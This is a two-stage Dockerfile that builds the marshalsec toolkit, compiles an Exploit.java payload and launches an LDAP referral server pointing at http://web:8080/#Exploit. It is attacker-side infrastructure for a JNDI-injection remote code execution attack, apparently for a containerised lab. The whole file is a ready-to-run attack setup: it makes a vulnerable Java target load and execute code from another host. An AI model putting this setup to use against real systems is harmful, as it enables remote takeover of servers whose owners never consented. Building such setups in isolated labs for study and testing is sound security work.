# Stage 1: Build marshalsec with all dependencies
FROM maven:3.8.5-openjdk-11 AS build
WORKDIR /build
RUN git clone https://github.com/mbechler/marshalsec.git
WORKDIR /build/marshalsec
RUN mvn clean package -DskipTests

# Stage 2: Create lightweight image with marshalsec and Exploit
FROM openjdk:8u131-jdk

# Set working directory
WORKDIR /app

# Copy compiled marshalsec "fat" jar (with dependencies)
COPY --from=build /build/marshalsec/target/marshalsec-*-all.jar marshalsec.jar

# Copy Exploit.java and compile
COPY Exploit.java .
RUN javac -source 8 -target 8 Exploit.java

# Start LDAPRefServer when container runs
CMD ["java", "-cp", "marshalsec.jar:.", "marshalsec.jndi.LDAPRefServer", "http://web:8080/#Exploit"]
